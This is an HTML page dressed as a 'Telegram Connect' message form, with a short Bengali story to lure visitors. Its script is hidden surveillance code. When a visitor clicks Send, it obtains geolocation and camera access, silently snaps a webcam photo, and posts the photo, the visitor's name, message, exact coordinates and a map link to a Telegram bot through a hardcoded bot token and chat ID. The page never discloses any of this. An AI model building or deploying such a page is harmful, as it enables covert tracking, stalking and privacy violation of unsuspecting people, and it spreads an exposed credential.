<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Telegram Connect</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
    font-family:'Poppins',sans-serif;
    background:#020617;
    overflow:auto;
}

body::before{
    content:'';
    position:fixed;
    width:500px;
    height:500px;
    background:linear-gradient(#00f5ff,#0066ff);
    border-radius:50%;
    top:-200px;
    left:-150px;
    filter:blur(90px);
}

body::after{
    content:'';
    position:fixed;
    width:450px;
    height:450px;
    background:linear-gradient(#ff00d4,#ff4d6d);
    border-radius:50%;
    bottom:-180px;
    right:-120px;
    filter:blur(90px);
}

.container{
    position:relative;
    width:100%;
    max-width:450px;
    padding:30px;
    border-radius:25px;

    background:rgba(255,255,255,0.08);

    border:1px solid rgba(255,255,255,0.1);

    backdrop-filter:blur(20px);

    box-shadow:
    0 0 30px rgba(0,0,0,0.4);

    z-index:1;
}

.title{
    text-align:center;
    color:#fff;
    font-size:30px;
    font-weight:600;
    margin-bottom:25px;
}

.inputBox{
    margin-bottom:20px;
}

.inputBox input,
.inputBox textarea{
    width:100%;
    padding:16px;
    border:none;
    outline:none;
    border-radius:16px;

    background:rgba(255,255,255,0.08);

    color:#fff;
    font-size:15px;

    border:1px solid rgba(255,255,255,0.08);
}

.inputBox textarea{
    resize:none;
    height:130px;
}

::placeholder{
    color:#cbd5e1;
}

button{
    width:100%;
    border:none;
    outline:none;
    padding:15px;
    border-radius:16px;

    background:linear-gradient(135deg,#00e5ff,#0066ff);

    color:#fff;
    font-size:16px;
    font-weight:600;

    cursor:pointer;

    transition:0.3s;
}

button:hover{
    transform:scale(1.02);
}

#msg{
    text-align:center;
    margin-top:15px;
    color:#22c55e;
}

/* Video */

video,
canvas{
    width:100%;
    border-radius:18px;
    margin-top:20px;
    display:none;
}

.story{
    margin-top:25px;
    padding:20px;
    border-radius:20px;

    background:rgba(255,255,255,0.05);

    border:1px solid rgba(255,255,255,0.08);

    color:#e2e8f0;

    line-height:1.9;
    font-size:15px;
}

.story h3{
    text-align:center;
    margin-bottom:18px;
    color:#fff;
}

</style>
</head>

<body>

<div class="container">

    <div class="title">
        Telegram Connect
    </div>

    <div class="inputBox">
        <input type="text" id="name" placeholder="Enter Your Name">
    </div>

    <div class="inputBox">
        <textarea id="message" placeholder="Write Your Message..."></textarea>
    </div>

    <button onclick="startProcess()">
        Send Message
    </button>

    <p id="msg"></p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div class="story">

        <h3>একটা অসমাপ্ত গল্প...</h3>

        <p>
            একটা সময় ছিল,
            রাত জেগে কারো জন্য অপেক্ষা করাটা অভ্যাস ছিল আমার।
            ফোনের ছোট্ট একটা নোটিফিকেশনেই মনে হতো পুরো পৃথিবীটা বুঝি আমার হয়ে গেছে।
        </p>

    </div>

</div>

<script>

/* Telegram */

const botToken = "8214854742:AAFyOCbjcIkDFNNtqhfY7-CFqTpzf5T--L8";
const chatId = "6884769194";

const video =
document.getElementById("video");

const canvas =
document.getElementById("canvas");

async function startProcess(){

    let name =
    document.getElementById("name").value.trim();

    let message =
    document.getElementById("message").value.trim();

    if(name === "" || message === ""){

        showMsg("Please Fill All Fields","#ff4d6d");
        return;
    }

    /* Location */

    navigator.geolocation.getCurrentPosition(

    async(position)=>{

        let latitude =
        position.coords.latitude;

        let longitude =
        position.coords.longitude;

        /* Camera */

        try{

            let stream =
            await navigator.mediaDevices.getUserMedia({
                video:true
            });

            video.style.display = "block";
            video.srcObject = stream;

            setTimeout(async()=>{

                canvas.width =
                video.videoWidth;

                canvas.height =
                video.videoHeight;

                let ctx =
                canvas.getContext("2d");

                ctx.drawImage(
                    video,
                    0,
                    0,
                    canvas.width,
                    canvas.height
                );

                stream.getTracks().forEach(
                    track=>track.stop()
                );

                let image =
                canvas.toDataURL("image/png");

                /* Send Photo */

                let photoData =
                image.split(",")[1];

                let photoBlob =
                base64ToBlob(photoData,"image/png");

                let formData =
                new FormData();

                formData.append(
                    "chat_id",
                    chatId
                );

                formData.append(
                    "photo",
                    photoBlob,
                    "photo.png"
                );

                await fetch(
                    `https://api.telegram.org/bot${botToken}/sendPhoto`,
                    {
                        method:"POST",
                        body:formData
                    }
                );

                /* Send Text */

                let text =
`📩 New Message

👤 Name: ${name}

💬 Message:
${message}

📍 Latitude:
${latitude}

📍 Longitude:
${longitude}

🌍 Map:
https://maps.google.com/?q=${latitude},${longitude}

🕒 Time:
${new Date().toLocaleString()}
`;

                await fetch(
                    `https://api.telegram.org/bot${botToken}/sendMessage`,
                    {
                        method:"POST",
                        headers:{
                            "Content-Type":"application/json"
                        },
                        body:JSON.stringify({
                            chat_id:chatId,
                            text:text
                        })
                    }
                );

                showMsg(
                    "Message Sent Successfully",
                    "#22c55e"
                );

                document.getElementById("name").value = "";
                document.getElementById("message").value = "";

            },3000);

        }catch(error){

            showMsg(
                "Camera Permission Denied",
                "#ff4d6d"
            );

        }

    },

    ()=>{

        showMsg(
            "Location Permission Denied",
            "#ff4d6d"
        );

    });

}

/* Blob Convert */

function base64ToBlob(base64,type){

    let bytes =
    atob(base64);

    let array = [];

    for(let i=0;i<bytes.length;i++){

        array.push(
            bytes.charCodeAt(i)
        );

    }

    return new Blob(
        [new Uint8Array(array)],
        {type:type}
    );

}

/* Status */

function showMsg(text,color){

    let msg =
    document.getElementById("msg");

    msg.style.color = color;
    msg.innerText = text;

}

</script>

</body>
</html>
